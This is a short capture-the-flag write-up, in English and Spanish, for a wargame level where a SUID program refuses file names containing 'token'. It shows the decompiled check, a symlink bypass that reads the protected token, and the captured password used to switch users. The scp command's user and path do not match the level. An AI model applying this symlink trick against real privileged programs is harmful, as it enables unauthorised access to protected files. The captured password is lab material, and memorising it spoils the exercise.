### LEVEL08

- Two files in the directory `level08`: `level08` and `token`.
- ls -la 
    ```bash
    -r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
    -r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
    -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
    -r-x------  1 level08 level08  675 Apr  3  2012 .profile
    -rw-------  1 flag08  flag08    26 Mar  5  2016 token
    ```
- I don't have access to `token`, and `level08` has SUID.
- I download `level08` locally.
    ```bash
    scp -P 4242 level14@192.168.1.36:/home/flag/flag08/flag08 .
    ```


---

### LEVEL08

- Dos archivos en el directorio `level08` y `token`
- ls -la 
    ```bash
    -r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
    -r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
    -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
    -r-x------  1 level08 level08  675 Apr  3  2012 .profile
    -rw-------  1 flag08  flag08    26 Mar  5  2016 token
    ```
- No tengo acceso a `token` y `level08` tiene SUID
- Descargo el level08 a local
    ```bash
    scp -P 4242 level14@192.168.1.36:/home/flag/flag08/flag08 .
    ```
- Uso Ghidra con level8
    ```c 
    pcVar1 = strstr((char *)in_stack_00000008[1],"token");
    if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",in_stack_00000008[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
    }
    ```

- Es un programa que lee un archivo que se pasa como primer y único parámetro 
- Pero hay un `if` que si el parametro es == 'token' no tenemos permisos
- La solucion es hacer un link a `token` y pasarle como parametro ese link
    ```bash
    level08@SnowCrash:~$ ln -sf ~/token /tmp/a
    level08@SnowCrash:~$ ./level08 /tmp/a
    quif5eloekouj29ke0vouxean
    ```
- Me da la clave para el usuario `flag08`
    ```bash
    level08@SnowCrash:~$ su flag08
    Password:
    Don't forget to launch getflag !
    flag08@SnowCrash:~$ getflag
    ```
